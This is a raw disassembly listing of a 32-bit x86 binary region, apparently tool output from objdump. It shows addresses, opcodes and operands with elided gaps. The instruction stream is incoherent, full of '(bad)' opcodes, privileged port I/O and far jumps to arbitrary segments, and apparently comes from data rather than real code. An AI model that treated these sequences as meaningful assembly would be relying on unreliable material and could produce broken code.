  41d3a7:	das    
  41d3a8:	fwait
  41d3a9:	clc    
  41d3aa:	cmp    BYTE PTR [edi-0x20e119ca],bh
  41d3b0:	sub    BYTE PTR [esi+0x79],cl
  41d3b3:	push   esp
  41d3b4:	mov    eax,ds:0xc4e22bf9
  41d3b9:	sbb    edi,DWORD PTR [esi+0x5c6a4184]
  41d3bf:	sahf   
  41d3c0:	mov    bl,0xec
  41d3c2:	fbstp  TBYTE PTR [esi+0x7f38622a]
  41d3c8:	xlat   BYTE PTR ds:[ebx]
  41d3c9:	daa    
  41d3ca:	fdivr  QWORD PTR [edx]
  41d3cc:	stos   BYTE PTR es:[edi],al
  41d3cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3ce:	fiadd  DWORD PTR [esi]
  41d3d0:	and    eax,ebp
  41d3d2:	repz and al,0x52
  41d3d5:	and    ah,BYTE PTR [edx-0x1a]
  41d3d8:	xor    bl,al
  41d3da:	and    edi,DWORD PTR [esi-0x6a]
  41d3dd:	jmp    0xcf17:0xef7e36d1
  41d3e4:	pusha  
  41d3e5:	or     al,0xbd
  41d3e7:	mov    al,ds:0xbd27d551
  41d3ec:	rol    DWORD PTR [edi],0x27
  41d3ef:	pop    esp
  41d3f0:	mov    eax,0xf1718cd4
  41d3f5:	push   ebx
  41d3f6:	cmp    BYTE PTR ds:0x8531b2ca,dh
  41d3fc:	push   0x61f09a0
  41d401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d402:	int3   
  41d403:	cdq    
  41d404:	lds    ebp,FWORD PTR [eax-0x47]
  41d407:	sti    
  41d408:	cmp    al,0xc6
  41d40a:	add    ebx,edx
  41d40c:	push   es
  41d40d:	in     al,dx
  41d40e:	call   0x5839fc02
  41d413:	sti    
  41d414:	call   0xe3fa:0x93304a3
  41d41b:	and    esi,DWORD PTR [ebx]
  41d41d:	pop    esi
  41d41e:	jno    0x41d428
  41d420:	scas   al,BYTE PTR es:[edi]
  41d421:	not    BYTE PTR [esi-0x4324f079]
  41d427:	mov    cl,0xb0
  41d429:	mov    ch,0xbe
  41d42b:	(bad)  
  41d42c:	push   ds
  41d42d:	stc    
  41d42e:	mov    edx,0x9558201c
  41d433:	jae    0x41d48e
  41d435:	push   ecx
  41d436:	loope  0x41d3df
  41d438:	gs xor al,0x5f
  41d43b:	pop    esi
  41d43c:	adc    al,0x7a
  41d43e:	pop    edi
  41d43f:	jbe    0x41d4a3
  41d441:	ins    DWORD PTR es:[edi],dx
  41d442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d443:	cli    
  41d444:	(bad)  
  41d445:	push   edx
  41d446:	ins    BYTE PTR es:[edi],dx
  41d447:	jecxz  0x41d453
  41d449:	imul   edi,DWORD PTR [eax+esi*8-0x51],0xbda478c5
  41d451:	sbb    edi,esi
  41d453:	sahf   
  41d454:	push   es
  41d455:	rol    BYTE PTR [edx+ecx*4],cl
  41d458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d459:	dec    esi
  41d45a:	repnz (bad) 
  41d45c:	dec    ebx
  41d45d:	test   al,0x57
  41d45f:	cdq    
  41d460:	loopne 0x41d3f6
  41d462:	lods   eax,DWORD PTR ds:[esi]
  41d463:	nop
  41d464:	ret    
  41d465:	stc    
  41d466:	mov    ecx,0x1684e141
  41d46b:	mov    al,ds:0xdc66a401
  41d470:	(bad)  
  41d471:	push   edi
  41d472:	das    
  41d473:	xchg   BYTE PTR [ecx-0x67fd0a03],al
  41d479:	sbb    eax,0x86481e3f
  41d47e:	cdq    
  41d47f:	fld    TBYTE PTR [esp+ecx*2-0x15c048f5]
  41d486:	push   ss
  41d487:	xor    al,0xeb
  41d489:	(bad)  
  41d48a:	imul   esp,DWORD PTR [esi-0x54],0x869d7e
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6c32:0x3a293f89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	adc    BYTE PTR ds:0xb940747c,0xd5
  41d513:	mov    ebp,0x18e5ce30
  41d518:	add    bl,BYTE PTR [ebx]
  41d51a:	push   eax
  41d51b:	mov    es:0x92e064f5,eax
  41d521:	imul   ebp,DWORD PTR [edi-0x4f6b638d],0x7a
  41d528:	je     0x41d515
  41d52a:	minps  xmm0,XMMWORD PTR [eax-0x16]
  41d52e:	xchg   ebp,eax
  41d52f:	pusha  
  41d530:	popa   
  41d531:	jb     0x41d583
  41d533:	sahf   
  41d534:	ror    DWORD PTR [esi+edx*8],cl
  41d537:	mov    DWORD PTR [ebx-0x6b],0x53b2cb86
  41d53e:	push   eax
  41d53f:	pop    edi
  41d540:	mov    al,0x6e
  41d542:	cli    
  41d543:	lahf   
  41d544:	gs jle 0x41d53d
  41d547:	lds    ecx,FWORD PTR [esi+0x4e9a50df]
  41d54d:	xor    ebp,DWORD PTR [eax]
  41d54f:	xor    eax,0xffcc6efa
  41d554:	mov    ebx,0x18799922
  41d559:	out    dx,eax
  41d55a:	cmp    eax,0x35e50927
  41d55f:	mov    ds:0xfa7bdeda,eax
  41d564:	clc    
  41d565:	aas    
  41d566:	loop   0x41d560
  41d568:	call   0x8697:0xef8695af
  41d56f:	popf   
  41d570:	or     ax,0x4932
  41d574:	or     al,0xd1
  41d576:	scas   eax,DWORD PTR es:[edi]
  41d577:	pop    edx
  41d578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d579:	pop    ss
  41d57a:	xchg   DWORD PTR [esi+0x7b],esp
  41d57d:	data16 int 0xdd
  41d580:	icebp  
  41d581:	cld    
  41d582:	mov    dl,0x62
  41d584:	sub    DWORD PTR ds:[edi+ebx*8+0x2e],esp
  41d589:	push   ecx
  41d58a:	push   DWORD PTR [edx+0x6950d720]
  41d590:	pop    esi
  41d591:	daa    
  41d592:	fwait
  41d593:	jle    0x41d5d7
  41d595:	cmp    eax,0x4b012b95
  41d59a:	pop    eax
  41d59b:	scas   al,BYTE PTR es:[edi]
  41d59c:	icebp  
  41d59d:	lock fst st(6)
  41d5a0:	(bad)  
  41d5a1:	mov    ah,dh
  41d5a3:	fnstsw WORD PTR [ebx]
  41d5a5:	loope  0x41d5e6
  41d5a7:	add    ch,BYTE PTR [edi+0x36456f88]
  41d5ad:	adc    DWORD PTR [edi-0x4f2db8b8],ebp
  41d5b3:	into   
  41d5b4:	jge    0x41d5a5
  41d5b6:	push   eax
  41d5b7:	or     esi,DWORD PTR [ebx-0x5f6c273e]
  41d5bd:	fnstcw WORD PTR [eax+0x52]
  41d5c0:	pop    ebp
  41d5c1:	push   ecx
  41d5c2:	(bad)
  41d5c5:	adc    bl,al
  41d5c7:	sub    eax,DWORD PTR [edi]
  41d5c9:	push   ecx
  41d5ca:	pop    esi
  41d5cb:	ret    0x270b
  41d5ce:	out    dx,al
  41d5cf:	add    DWORD PTR ds:0x636cb2eb,ecx
  41d5d5:	or     BYTE PTR [esi-0x5e64617d],bl
  41d5db:	dec    ebx
  41d5dc:	or     ah,ah
  41d5de:	loop   0x41d653
  41d5e0:	and    al,0x24
  41d5e2:	test   DWORD PTR [edx+ebp*4],edx
  41d5e5:	call   DWORD PTR [eax]
  41d5e7:	xchg   DWORD PTR [esi-0x5c3c6c4b],edi
  41d5ed:	ss mov ch,0x45
  41d5f0:	dec    esp
  41d5f1:	loop   0x41d609
  41d5f3:	jnp    0x41d60c
  41d5f5:	mov    esi,ebx
  41d5f7:	jecxz  0x41d5b5
  41d5f9:	add    cl,0x2b
  41d5fc:	mov    ds:0x20fce88e,eax
  41d601:	jge    0x41d642
  41d603:	adc    eax,0x596ad345
  41d608:	cs pop ebp
  41d60a:	jb     0x41d5b1
  41d60c:	cmp    BYTE PTR [edx-0x19],bh
  41d60f:	cmp    al,BYTE PTR [eax]
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x7266e435
  41d681:	add    al,0x71
  41d683:	jmp    0x104:0x13870
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	retf   
  41d68d:	pop    ss
  41d68e:	leave  
  41d68f:	dec    ebx
  41d690:	mov    ds:0xf5633ddb,eax
  41d695:	and    BYTE PTR [edi+0x70f4fafb],0xe0
  41d69c:	or     bh,ah
  41d69e:	sahf   
  41d69f:	fstp   DWORD PTR ds:0x36ddf0bd
  41d6a5:	mov    ch,0x37
  41d6a7:	and    edi,DWORD PTR [ebx+0x14]
  41d6aa:	add    eax,0x65880adf
  41d6af:	ret    
  41d6b0:	ins    BYTE PTR es:[edi],dx
  41d6b1:	cmp    DWORD PTR ds:0xec05b63e,edx
  41d6b7:	xor    BYTE PTR [edi-0x788e4c9b],ah
  41d6bd:	aaa    
  41d6be:	test   al,0x3a
  41d6c0:	push   esp
  41d6c1:	shl    BYTE PTR [edi-0xbac2b04],0x38
  41d6c8:	stc    
  41d6c9:	adc    ch,cl
  41d6cb:	mov    ds:0xd9091118,al
  41d6d0:	jp     0x41d6ff
  41d6d2:	hlt    
  41d6d3:	popa   
  41d6d4:	jo     0x41d72b
  41d6d6:	fldenv [esi]
  41d6d8:	retf   
  41d6d9:	jo     0x41d6b2
  41d6db:	call   0xc64ad718
  41d6e0:	pop    esp
  41d6e1:	lods   al,BYTE PTR ds:[esi]
  41d6e2:	mov    ah,0xe6
  41d6e4:	imul   edx,DWORD PTR [ecx+0x24ec8921],0xd0d32dd3
  41d6ee:	sub    al,cl
  41d6f0:	push   0xd0ef7fe1
  41d6f5:	inc    ebx
  41d6f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6f7:	gs into 
  41d6f9:	adc    al,0x20
  41d6fb:	pop    ss
  41d6fc:	cmp    eax,0xbfe94588
  41d701:	idiv   eax
  41d703:	mov    ecx,0x6303259b
  41d708:	in     al,0x96
  41d70a:	dec    ebp
  41d70b:	sbb    ebp,DWORD PTR [eax-0x14]
  41d70e:	inc    eax
  41d70f:	outs   dx,BYTE PTR ds:[esi]
  41d710:	popf   
  41d711:	push   ss
  41d712:	les    esi,FWORD PTR ds:0x497a6420
  41d718:	and    al,0x8
  41d71a:	and    ebx,ebp
  41d71c:	xor    esi,edx
  41d71e:	outs   dx,DWORD PTR ds:[esi]
  41d71f:	jp     0x41d765
  41d721:	test   BYTE PTR [esi],0x99
  41d724:	push   ebp
  41d725:	(bad)  
  41d727:	shl    BYTE PTR [edi+0x15],0x41
  41d72b:	faddp  st(6),st
  41d72d:	stc    
  41d72e:	aam    0x65
  41d730:	adc    esp,0xbff6b007
  41d736:	jno    0x41d6e1
  41d738:	jns    0x41d754
  41d73a:	pop    esi
  41d73b:	test   BYTE PTR ds:0x2d2e58ac,ah
  41d741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d742:	jmp    0x41d759
  41d744:	push   ecx
  41d745:	inc    esp
  41d746:	mov    ecx,0x9ef41eec
  41d74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d74c:	mov    dl,0xa8
  41d74e:	adc    al,0x1c
  41d750:	pop    eax
  41d751:	sbb    BYTE PTR [edx],ah
  41d753:	mov    DWORD PTR [edx+0x4d198dd0],eax
  41d759:	push   ebx
  41d75a:	(bad)  
  41d75b:	sahf   
  41d75c:	jbe    0x41d796
  41d75e:	and    eax,0xdc415a34
  41d763:	rdtsc  
  41d765:	mov    edi,0xe48cf883
  41d76a:	jl     0x41d7e3
  41d76c:	jno    0x41d79b
  41d76e:	xchg   esi,eax
  41d76f:	mov    ah,0x5e
  41d771:	lods   al,BYTE PTR ds:[esi]
  41d772:	jbe    0x41d75e
  41d774:	cmp    al,0x60
  41d776:	dec    ebp
  41d777:	test   DWORD PTR ds:0x6b144376,esp
  41d77d:	inc    ebp
  41d77e:	pop    edi
  41d77f:	sub    DWORD PTR [ebx-0x62],edi
  41d782:	mov    esi,0xc02e3677
  41d787:	mov    ebp,0x62802cb2
  41d78c:	cmc    
  41d78d:	mov    DWORD PTR [edx],ebp
  41d78f:	dec    edx
	...
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	dec    bh
  41d802:	ds push ecx
  41d804:	je     0x41d83f
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    al,0x1
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	xchg   ebx,eax
  41d80d:	mov    al,0x3f
  41d80f:	aam    0x69
  41d811:	jae    0x41d856
  41d813:	mov    ds:0xa570292f,eax
  41d818:	je     0x41d852
  41d81a:	push   ss
  41d81b:	mov    edx,0x7daff6cb
  41d820:	jl     0x41d7a3
  41d822:	sub    esi,DWORD PTR [edx-0x3104893e]
  41d828:	xor    al,0xa8
  41d82a:	ins    BYTE PTR es:[edi],dx
  41d82b:	push   ds
  41d82c:	loope  0x41d8ac
  41d82e:	in     eax,0xaf
  41d830:	or     eax,ecx
  41d832:	push   ss
  41d833:	(bad)  
  41d834:	jne    0x41d7e8
  41d836:	dec    edx
  41d837:	inc    ebx
  41d838:	inc    edx
  41d839:	pop    eax
  41d83a:	out    0x8d,eax
  41d83c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d83d:	outs   dx,DWORD PTR ds:[esi]
  41d83e:	enter  0xbb46,0xd1
  41d842:	mov    ch,0xcb
  41d844:	cli    
  41d845:	in     al,dx
  41d846:	out    0xbb,eax
  41d848:	inc    ebx
  41d849:	add    DWORD PTR [ecx+0x26],eax
  41d84c:	test   DWORD PTR [ebx-0x67],esp
  41d84f:	in     al,0xf7
  41d851:	loopne 0x41d8bc
  41d853:	test   al,0x35
  41d855:	in     al,dx
  41d856:	mov    cl,0xb3
  41d858:	fst    st(2)
  41d85a:	push   ss
  41d85b:	test   BYTE PTR [edi+ecx*8+0x73],bh
  41d85f:	sbb    eax,0x3de63211
  41d864:	idiv   ah
  41d866:	sbb    esi,edx
  41d868:	mov    BYTE PTR [eax-0x5a],al
  41d86b:	outs   dx,DWORD PTR ds:[esi]
  41d86c:	pop    edx
  41d86d:	dec    eax
  41d86e:	repz jo 0x41d894
  41d871:	push   0x77
  41d873:	jp     0x41d860
  41d875:	pop    ebx
  41d876:	xor    al,0xf1
  41d878:	aaa    
  41d879:	mov    al,ds:0x2888c079
  41d87e:	mov    edx,0xe42ac8e1
  41d883:	je     0x41d8e8
  41d885:	jg     0x41d880
  41d887:	iret   
  41d888:	rcl    BYTE PTR [eax+0x28],cl
  41d88b:	inc    ebx
  41d88c:	jno    0x41d8b2
  41d88e:	test   ebx,esp
  41d890:	cwde   
  41d891:	rol    BYTE PTR [edx-0x4183c231],0xa8
  41d898:	push   esi
  41d899:	sub    al,0xd3
  41d89b:	int3   
  41d89c:	test   eax,0xdcf877e0
  41d8a1:	sub    esi,DWORD PTR [ecx+edi*1-0x362a51c6]
  41d8a8:	xchg   ebp,eax
  41d8a9:	and    eax,0x6e559328
  41d8ae:	(bad)  
  41d8af:	mov    edx,0x13ef1a84
  41d8b4:	cmp    al,0xde
  41d8b6:	das    
  41d8b7:	imul   esp,DWORD PTR [eax-0x46dff92d],0xf52c2c0a
  41d8c1:	pop    ebp
  41d8c2:	and    eax,0xad21299e
  41d8c7:	pop    ebx
  41d8c8:	es ret 
  41d8ca:	adc    al,0x69
  41d8cc:	int3   
  41d8cd:	into   
  41d8ce:	mov    al,ds:0xe89bfc78
  41d8d3:	iret   
  41d8d4:	jle    0x41d88d
  41d8d6:	adc    al,0xec
  41d8d8:	sbb    edi,0xc6f67763
  41d8de:	sbb    al,0x62
  41d8e0:	mov    ch,0xe5
  41d8e2:	arpl   WORD PTR [ecx+0x7062cf46],ax
  41d8e8:	push   ebx
  41d8e9:	pop    es
  41d8ea:	sub    dh,BYTE PTR [ebx]
  41d8ec:	push   ebp
  41d8ed:	adc    DWORD PTR [ecx],edi
  41d8ef:	pop    edx
  41d8f0:	js     0x41d930
  41d8f2:	sub    esi,DWORD PTR [edx-0x51496f5d]
  41d8f8:	jbe    0x41d96c
  41d8fa:	addr16 jnp 0x41d91b
  41d8fd:	fadd   st(0),st
  41d8ff:	(bad)
  41d903:	push   0xb9f58e12
  41d908:	pop    esi
  41d909:	(bad)  
  41d90a:	mov    edx,0x2b555fe4
  41d90f:	inc    esi
	...
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	test   DWORD PTR gs:[edi],0x3a7891f9
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    al,0x1
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	mov    BYTE PTR [esi+0x72],al
  41d98f:	inc    esi
  41d990:	and    bl,BYTE PTR [edx]
  41d992:	push   ss
  41d993:	sahf   
  41d994:	dec    edi
  41d995:	jno    0x41da13
  41d997:	neg    BYTE PTR [eax-0x4c8f684d]
  41d99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d99e:	repnz into 
  41d9a0:	inc    ebp
  41d9a1:	sub    al,0xe1
  41d9a3:	jp     0x41d97c
  41d9a5:	mov    ds:0x89cd0298,al
  41d9aa:	out    dx,eax
  41d9ab:	idiv   dh
  41d9ad:	adc    ecx,DWORD PTR [ebp+0x23]
  41d9b0:	stos   DWORD PTR es:[edi],eax
  41d9b1:	or     eax,0xac9a87b4
  41d9b6:	stos   DWORD PTR es:[edi],eax
  41d9b7:	xor    esp,DWORD PTR [esi+0x37]
  41d9ba:	stos   BYTE PTR es:[edi],al
  41d9bb:	mov    esp,0x8e9621dc
  41d9c0:	lods   eax,DWORD PTR ds:[esi]
  41d9c1:	hlt    
  41d9c2:	mov    cl,BYTE PTR [ebp+0x2e4a5d30]
  41d9c8:	in     al,0xed
  41d9ca:	jae    0x41da29
  41d9cc:	jae    0x41da24
  41d9ce:	out    dx,al
  41d9cf:	xchg   ebp,eax
  41d9d0:	push   esi
  41d9d1:	cmp    al,0x76
  41d9d3:	xor    cl,al
  41d9d5:	add    BYTE PTR [edx],ah
  41d9d7:	inc    esp
  41d9d8:	(bad)  
  41d9d9:	ja     0x41da18
  41d9db:	push   ds
  41d9dc:	popa   
  41d9dd:	arpl   WORD PTR [eax],si
  41d9df:	or     al,0xa7
  41d9e1:	dec    eax
  41d9e2:	push   esi
  41d9e3:	adc    DWORD PTR [esi-0x71],eax
  41d9e6:	push   ebx
  41d9e7:	adc    DWORD PTR [ebx+edi*2+0x17],edx
  41d9eb:	mov    bh,cl
  41d9ed:	pushf  
  41d9ee:	pop    es
  41d9ef:	push   0x64
  41d9f1:	mov    DWORD PTR [eax-0x2191dbf8],edi
  41d9f7:	sbb    al,0x92
  41d9f9:	and    DWORD PTR ds:0x5f7cbde4,esi
  41d9ff:	mov    edx,0xc4e2ba6a
  41da04:	dec    ebp
  41da05:	imul   edi,DWORD PTR [edx+ebx*2-0x13],0x43
  41da0a:	pop    esp
  41da0b:	mov    dl,0x81
  41da0d:	push   es
  41da0e:	sbb    BYTE PTR [eax+ebx*1+0xd],cl
  41da12:	retf   0x16c6
  41da15:	call   0xc76d:0x649fcfdc
  41da1c:	ret    
  41da1d:	sub    al,dh
  41da1f:	shr    DWORD PTR [edx+edi*8],cl
  41da22:	pop    edx
  41da23:	mov    WORD PTR [esi-0x79e8f1dc],es
  41da29:	push   ebx
  41da2a:	xchg   DWORD PTR [esi+0x39],edx
  41da2d:	jbe    0x41d9fe
  41da2f:	loop   0x41da55
  41da31:	mov    esi,0x3da04ad7
  41da36:	iret   
  41da37:	or     esi,DWORD PTR [edi-0x65]
  41da3a:	push   ss
  41da3b:	std    
  41da3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da3d:	xor    DWORD PTR [eax],esp
  41da3f:	arpl   WORD PTR [edi*2-0x5bb6aa46],cx
  41da46:	lods   eax,DWORD PTR ds:[esi]
  41da47:	add    edi,ebp
  41da49:	out    0x3f,al
  41da4b:	xchg   esi,eax
  41da4c:	and    eax,0x6c8f6424
  41da51:	mov    DWORD PTR [ebx+0x6ac64561],esi
  41da57:	sbb    BYTE PTR [edx-0x11e78176],cl
  41da5d:	jno    0x41da31
  41da5f:	add    ebx,DWORD PTR [eax]
  41da61:	icebp  
  41da62:	ja     0x41daae
  41da64:	popa   
  41da65:	stos   BYTE PTR es:[edi],al
  41da66:	mov    ebp,0x3cfe7d72
  41da6b:	jb     0x41dab9
  41da6d:	daa    
  41da6e:	xor    al,0x11
  41da70:	sahf   
  41da71:	adc    ebp,DWORD PTR [eax-0x21]
  41da74:	scas   eax,DWORD PTR es:[edi]
  41da75:	ss push edx
  41da77:	push   es
  41da78:	iret   
  41da79:	or     al,0x39
  41da7b:	xchg   esi,eax
  41da7c:	inc    ecx
  41da7d:	pop    edx
  41da7e:	sbb    al,0xbe
  41da80:	jg     0x41da5c
  41da82:	ret    
  41da83:	mov    ch,0xb0
  41da85:	loope  0x41dafc
  41da87:	or     cl,ah
  41da89:	stos   BYTE PTR es:[edi],al
  41da8a:	cli    
  41da8b:	into   
  41da8c:	les    ebp,FWORD PTR [edx+edx*1+0x68]
	...
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x2f
  41db01:	data16 stos BYTE PTR es:[edi],al
  41db03:	je     0x41db81
  41db05:	cmp    eax,DWORD PTR [ecx]
  41db07:	add    BYTE PTR [ecx+eax*1],al
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	outs   dx,DWORD PTR ds:[esi]
  41db0d:	and    DWORD PTR [esi-0x695b158],edx
  41db13:	sub    al,0xf4
  41db15:	adc    al,0xfd
  41db17:	hlt    
  41db18:	ins    BYTE PTR es:[edi],dx
  41db19:	retf   0xc0ce
  41db1c:	ins    DWORD PTR es:[edi],dx
  41db1d:	or     dh,0x81
  41db20:	cmp    al,0xcb
  41db22:	sti    
  41db23:	add    DWORD PTR [eax],edi
  41db25:	add    al,0x28
  41db27:	mov    cs,WORD PTR [edi-0x6383f82b]
  41db2d:	dec    BYTE PTR [eax-0x434a94ac]
  41db33:	lock cwde 
  41db35:	jle    0x41daf7
  41db37:	out    dx,eax
  41db38:	pop    ebp
  41db39:	fcom   DWORD PTR [edi+0x11432d]
  41db3f:	add    ch,0x89
  41db42:	push   edx
  41db43:	push   ecx
  41db44:	fldenv [ecx]
  41db46:	mov    ss,WORD PTR [edi+0x49eca945]
  41db4c:	fcomip st,st(4)
  41db4e:	repz (bad) 
  41db50:	adc    esp,DWORD PTR [eax-0xa]
  41db53:	adc    dl,al
  41db55:	idiv   BYTE PTR [esi-0x6a]
  41db58:	mov    al,ds:0x39eb2382
  41db5d:	clc    
  41db5e:	sahf   
  41db5f:	add    eax,0x794c3cec
  41db64:	fdiv   st(4),st
  41db66:	rcl    BYTE PTR [edx-0x23],1
  41db69:	pop    ebx
  41db6a:	aas    
  41db6b:	hlt    
  41db6c:	pop    esp
  41db6d:	sub    ebx,DWORD PTR [edi]
  41db6f:	cld    
  41db70:	int3   
  41db71:	inc    ebp
  41db72:	imul   ebx,DWORD PTR [eax],0xfffffff9
  41db75:	fcomp  st(4)
  41db77:	(bad)  [edi+0x7b]
  41db7a:	pop    eax
  41db7b:	xchg   edx,eax
  41db7c:	sbb    cl,BYTE PTR [esi+edx*8-0x33e0ae92]
  41db83:	(bad)  
  41db84:	ja     0x41db07
  41db86:	sub    al,0x7b
  41db88:	mov    WORD PTR [eax+0x74],es
  41db8b:	inc    edx
  41db8c:	dec    edi
  41db8d:	xor    al,0x96
  41db8f:	add    esp,DWORD PTR [esi+eiz*1-0x61f971cb]
  41db96:	outs   dx,DWORD PTR ds:[esi]
  41db97:	xor    eax,0xc0b2a80d
  41db9c:	sbb    DWORD PTR [bp+di+0x15],0xb3db0704
  41dba4:	les    esi,FWORD PTR [ebp-0x54]
  41dba7:	xor    eax,0xe918d7d2
  41dbac:	and    DWORD PTR [ecx+edx*1],ecx
  41dbaf:	mov    DWORD PTR [ecx+0x3a],edi
  41dbb2:	out    0x7b,al
  41dbb4:	add    al,0x5b
  41dbb6:	jbe    0x41db8f
  41dbb8:	bound  esi,QWORD PTR [ebx+0x5]
  41dbbb:	outs   dx,DWORD PTR ds:[esi]
  41dbbc:	xor    BYTE PTR [ebp+0x70],0xfc
  41dbc0:	sub    al,0xd5
  41dbc2:	add    BYTE PTR [edi],dl
  41dbc4:	repz add DWORD PTR [esi+0x1adb652e],edi
  41dbcb:	imul   edi,DWORD PTR [ebx+0x1d],0x888d1004
  41dbd2:	fst    DWORD PTR [edx+0x209fb250]
  41dbd8:	dec    edi
  41dbd9:	outs   dx,DWORD PTR ds:[esi]
  41dbda:	sub    al,0x56
  41dbdc:	bound  eax,QWORD PTR [ecx]
  41dbde:	hlt    
  41dbdf:	sbb    DWORD PTR [esi],eax
  41dbe1:	(bad)
  41dbe4:	outs   dx,BYTE PTR ds:[esi]
  41dbe5:	hlt    
  41dbe6:	repz shr DWORD PTR [edx+0x61],0x85
  41dbeb:	cmp    al,BYTE PTR [eax+ebp*1-0x2e]
  41dbef:	ret    0x84b
  41dbf2:	inc    BYTE PTR [edi+0x5f]
  41dbf5:	lods   eax,DWORD PTR ds:[esi]
  41dbf6:	sbb    ebp,DWORD PTR [edx+0x6a]
  41dbf9:	outs   dx,DWORD PTR ds:[esi]
  41dbfa:	mov    edi,0xb55e86db
  41dbff:	fcmovb st,st(7)
  41dc01:	jns    0x41dbd4
  41dc03:	sub    DWORD PTR [eax-0x7799bef9],0x5d75a871
  41dc0d:	retf   0x824f
	...
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x66b0d050]
  41dc81:	or     DWORD PTR [eax],0x13c803f
  41dc87:	add    BYTE PTR [ecx+eax*1],al
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	jg     0x41dc41
  41dc8e:	sub    dh,cl
  41dc90:	sub    al,0xb5
  41dc92:	fcmovne st,st(3)
  41dc94:	inc    DWORD PTR [edx-0x68]
  41dc97:	xchg   esi,eax
  41dc98:	or     dl,BYTE PTR [edi]
  41dc9a:	outs   dx,DWORD PTR ds:[esi]
  41dc9b:	jbe    0x41dcda
  41dc9d:	xchg   edx,eax
  41dc9e:	mov    dh,BYTE PTR fs:[esi]
  41dca1:	push   ecx
  41dca2:	data16 aad 0x88
  41dca5:	adc    ch,BYTE PTR [edx]
  41dca7:	out    0xb9,eax
  41dca9:	dec    BYTE PTR [esp+edi*4+0x3c]
  41dcad:	ds push 0x1d
  41dcb0:	sub    BYTE PTR [ecx-0x23],0xfe
  41dcb4:	fdivr  DWORD PTR [eax]
  41dcb6:	xor    cl,BYTE PTR [edi+0x49]
  41dcb9:	pop    edi
  41dcba:	adc    eax,0xfd29cd71
  41dcbf:	mov    esi,esp
  41dcc1:	adc    BYTE PTR [esi],bh
  41dcc3:	out    0x29,al
  41dcc5:	mov    edi,0x33062ee7
  41dcca:	cmp    DWORD PTR [esi+0x3a],0x32
  41dcce:	or     esp,DWORD PTR [ecx]
  41dcd0:	xor    BYTE PTR [ecx],ch
  41dcd2:	xor    esp,edx
  41dcd4:	int3   
  41dcd5:	mov    al,ds:0x56153988
  41dcda:	jmp    0x41dc79
  41dcdc:	mov    al,0x71
  41dcde:	pushf  
  41dcdf:	iret   
  41dce0:	jnp    0x41dd1d
  41dce2:	lea    edx,[esi]
  41dce4:	sbb    BYTE PTR [ebx+0x49],bl
  41dce7:	inc    edx
  41dce8:	fnstcw WORD PTR [edx+0x7b]
  41dceb:	mov    eax,DWORD PTR [esi]
  41dced:	xchg   DWORD PTR [ebx+0x7a],eax
  41dcf0:	adc    bh,bl
  41dcf2:	leave  
  41dcf3:	and    ecx,eax
  41dcf5:	fwait
  41dcf6:	pop    ebp
  41dcf7:	bnd call 0xeedef25f
  41dcfd:	xchg   esp,eax
  41dcfe:	mov    al,ds:0x1cdfc7da
  41dd03:	aad    0x2
  41dd05:	sub    DWORD PTR [ecx],ecx
  41dd07:	call   0xd7b58968
  41dd0c:	icebp  
  41dd0d:	dec    ecx
  41dd0e:	mov    ecx,0xaf0b653a
  41dd13:	sub    esp,DWORD PTR [eax+0x4564e0e1]
  41dd19:	jp     0x41dd4e
  41dd1b:	arpl   WORD PTR [eax-0x73],di
  41dd1e:	xchg   edi,eax
  41dd1f:	cmp    eax,0x47e76c3b
  41dd24:	and    BYTE PTR [ebx],cl
  41dd26:	adc    al,0x2e
  41dd28:	imul   edi,esp,0x967b868e
  41dd2e:	pop    eax
  41dd2f:	fnstsw WORD PTR [ecx]
  41dd31:	pop    ds
  41dd32:	repnz mov ?,WORD PTR [edx]
  41dd35:	pop    esp
  41dd36:	push   edi
  41dd37:	aam    0x25
  41dd39:	add    BYTE PTR [eax+ebx*2+0x51e6ca7c],ch
  41dd40:	inc    ebx
  41dd41:	sub    dl,BYTE PTR [ecx+0x4b]
